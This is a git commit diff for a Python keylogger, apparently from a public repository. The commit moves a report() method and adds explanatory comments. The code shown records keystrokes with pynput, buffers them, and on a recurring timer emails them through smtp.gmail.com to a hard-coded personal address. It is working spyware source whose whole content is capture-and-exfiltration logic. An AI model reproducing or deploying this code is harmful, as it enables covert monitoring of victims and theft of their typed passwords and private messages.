ce9eb8714415bec0610cde84a1cc1d3057a4ecf6
Joseph Merigala <104745031+13HJoe@users.noreply.github.com>
2024-08-02 08:56:48 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -15,17 +15,12 @@ class KeyLog:
         try:
             cur = (str(key.char))
         except AttributeError:
+            # attribute = `Key.Space`
             if key==key.space:
                 cur = " "
             else:
                 cur = "\n"+str(key)+"\n"
         self.append_buffer(cur)
-
-    def report(self):
-        self.send_mail(self.email, self.password, self.buffer)
-        self.buffer=""
-        timer = threading.Timer(self.interval, self.report)
-        timer.start()
 
     def send_mail(self, email, password, message):
         server = smtplib.SMTP("smtp.gmail.com",587)
@@ -33,6 +28,14 @@ class KeyLog:
         server.login(email, password)
         server.sendmail(email, "joseph.merigala@gmail.com", message)
         server.quit()
+    def report(self):
+        self.send_mail(self.email, self.password, "\n\n"+self.buffer) # \n\n to skip `subject` field
+        self.buffer=""
+        timer = threading.Timer(self.interval, self.report)
+        # above creates a new thread while key_listener keeps running
+        # the function is recursively executed with b/w interval
+        timer.start()
+
 
     def run(self):
         #key_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
